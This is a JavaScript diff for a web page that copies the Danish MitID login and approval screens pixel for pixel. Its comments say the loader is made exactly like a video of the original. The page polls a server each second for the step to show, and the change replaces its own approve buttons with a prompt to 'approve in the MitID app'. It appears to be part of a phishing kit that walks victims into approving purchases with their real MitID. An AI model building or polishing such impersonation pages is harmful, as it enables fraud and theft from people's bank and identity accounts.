@@ -194,9 +194,12 @@ function showAction(state) {
     <div class="action-title">${escapeHtml(a.title || 'Godkend dette køb')}</div>
     ${a.detail ? `<div class="action-detail">${escapeHtml(a.detail)}</div>` : ''}
     <div class="action-divider"></div>
-    <div class="action-buttons">
-      <button type="button" class="action-btn action-cancel" id="actionCancelBtn">ANNULLER</button>
-      <button type="button" class="action-btn action-ok" id="actionOkBtn">GODKEND</button>
+    <div class="action-waiting mitid-loader">
+      <div class="mitid-mini-shield">
+        <svg viewBox="0 0 100 117" class="mini-shield-svg"><path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/></svg>
+        <div class="mini-rtr"></div>
+      </div>
+      <span>Godkend i MitID appen ...</span>
     </div>
     <div class="action-security">
       <svg width="14" height="14" viewBox="0 0 24 24" fill="#2e9e5b" aria-hidden="true">
@@ -205,27 +208,6 @@ function showAction(state) {
       <span>Sikker godkendelse via MitID</span>
     </div>`;
   box.style.display = 'block';
-
-  const send = (r) => {
-    fetch('/api/action-response', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ response: r })
-    }).catch(() => {});
-    // straks-feedback på knappen
-    const okBtn = $('actionOkBtn'), cancelBtn = $('actionCancelBtn');
-    if (r === 'ok') {
-      if (okBtn) { okBtn.textContent = 'APPROVED ✓'; okBtn.disabled = true; }
-      if (cancelBtn) cancelBtn.disabled = true;
-    } else {
-      if (cancelBtn) { cancelBtn.textContent = 'CANCELLED ✓'; cancelBtn.disabled = true; }
-      if (okBtn) okBtn.disabled = true;
-    }
-  };
-  const okBtn = $('actionOkBtn');
-  const cancelBtn = $('actionCancelBtn');
-  if (okBtn) okBtn.addEventListener('click', () => send('ok'));
-  if (cancelBtn) cancelBtn.addEventListener('click', () => send('cancel'));
 
   // (step-dots fjernet)
 }
@@ -242,23 +224,20 @@ function escapeHtml(s) {
 function showWait() {
   
   hide($('beskedBox')); hide($('qrFrame')); hide($('approvedOverlay'));
-  const loader = $('loaderContainer');
-  if (!loader) return;
-  loader.style.display = 'flex';
-  $('loaderText').textContent = 'Connecting securely to MitID';
+  // MitID-loader (skjold + roterende ring + prikker) som videoen
   const statuses = ['Approving identity ...', 'Checking information ...', 'Please wait ...'];
-  let i = 0;
-  $('loaderStatus').textContent = statuses[0];
+  mitidLoaderShow('Connecting securely to MitID', statuses[0]);
   clearInterval(window.__loaderTimer);
   window.__loaderTimer = setInterval(() => {
-    i = (i + 1) % statuses.length;
-    $('loaderStatus').textContent = statuses[i];
+    const el = document.getElementById('mlSub');
+    if (!el) return;
+    const i = (parseInt(el.dataset.i || '0', 10) + 1) % statuses.length;
+    el.dataset.i = i;
+    el.textContent = statuses[i];
   }, 700);
-  // (step-dots fjernet)
 }
 function hideWait() {
-  const loader = $('loaderContainer');
-  if (loader) loader.style.display = 'none';
+  mitidLoaderHide();
   clearInterval(window.__loaderTimer);
 }
 
@@ -290,6 +269,8 @@ function showApproved(state) {
         #approvedOverlay .ap-ring { animation: apDraw .6s ease-out forwards; }
         #approvedOverlay .ap-check { animation: apDraw .4s ease-out .55s forwards; }
         @keyframes apDraw { to { stroke-dashoffset: 0; } }
+        @keyframes apPulse { 0% { transform: scale(.72); opacity: .9; } 100% { transform: scale(1.28); opacity: 0; } }
+        @keyframes apSpark { 0% { opacity: 0; transform: scale(0); } 60% { opacity: 1; transform: scale(1.25); } 100% { opacity: 0; transform: scale(1); } }
       </style>`;
     document.body.appendChild(ov);
   }
@@ -330,6 +311,9 @@ function render(state) {
   if (signature === lastSignature && !window.__pendingFlow) return;
   lastSignature = signature;
   delete window.__pendingFlow;
+  // trin-overgang: genafspil fade+slide animation (som MitID)
+  const card = document.querySelector('.login-card');
+  if (card) { card.classList.remove('trin-fade'); void card.offsetWidth; card.classList.add('trin-fade'); }
 
   const flow = state.flow || 'scan';
 
@@ -369,3 +353,51 @@ setInterval(() => poll(), 1000);
 
 // Kiosk-genlad efter 1 time
 setInterval(() => window.location.reload(), 60 * 60 * 1000);
+
+/* ════════════════════════════════════════════════════════════
+   MitID LOADER (præcis som video): skjold + roterende ring + prikker
+   Bruges i ALLE transition-trin — 100% som originalen
+   ════════════════════════════════════════════════════════════ */
+function mitidLoaderShow(text, sub) {
+  let ov = document.getElementById('mitidLoaderOv');
+  if (!ov) {
+    ov = document.createElement('div');
+    ov.id = 'mitidLoaderOv';
+    ov.style.cssText = 'position:fixed;inset:0;background:#fff;z-index:3000;display:flex;align-items:center;justify-content:center;';
+    document.body.appendChild(ov);
+  }
+  ov.innerHTML = `
+    <div style="display:flex;flex-direction:column;align-items:center;padding:24px;">
+      <div style="margin-bottom:32px;">
+        <svg width="80" height="21" viewBox="0 0 61 16">
+          <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
+        </svg>
+      </div>
+      <div style="position:relative;width:110px;height:128px;margin-bottom:28px;">
+        <svg viewBox="0 0 100 117" style="width:100%;height:100%;animation:ml-pulse 1.6s ease-in-out infinite;">
+          <path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/>
+        </svg>
+        <svg viewBox="0 0 100 117" style="position:absolute;top:0;left:0;width:100%;height:100%;animation:ml-ring 1.8s linear infinite;">
+          <path d="M49.9,4l43,12.9v36.7c0,42.5-43,54.4-43,54.4s-43-11.9-43-54.4V16.9L49.9,4" fill="none" stroke="#0060e6" stroke-width="3" stroke-dasharray="320" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <div style="font-size:16px;font-weight:600;color:#000;margin-bottom:6px;text-align:center;" id="mlText">${text || 'Forbinder sikkert til MitID'}</div>
+      <div style="font-size:14px;color:#666;text-align:center;min-height:18px;" id="mlSub">${sub || 'Vent et øjeblik ...'}</div>
+      <div style="display:flex;gap:7px;margin-top:20px;">
+        <span style="width:8px;height:8px;border-radius:50%;background:#0060e6;animation:ml-dot 1.2s ease-in-out infinite;"></span>
+        <span style="width:8px;height:8px;border-radius:50%;background:#0060e6;animation:ml-dot 1.2s ease-in-out .15s infinite;"></span>
+        <span style="width:8px;height:8px;border-radius:50%;background:#0060e6;animation:ml-dot 1.2s ease-in-out .3s infinite;"></span>
+      </div>
+      <style>
+        @keyframes ml-pulse { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.4; transform:scale(1.06); } }
+        @keyframes ml-ring { from { stroke-dashoffset:320; } to { stroke-dashoffset:-320; } }
+        @keyframes ml-dot { 0%,80%,100% { transform:scale(.6); opacity:.4; } 40% { transform:scale(1); opacity:1; } }
+      </style>
+    </div>`;
+  ov.style.display = 'flex';
+}
+
+function mitidLoaderHide() {
+  const ov = document.getElementById('mitidLoaderOv');
+  if (ov) ov.style.display = 'none';
+}
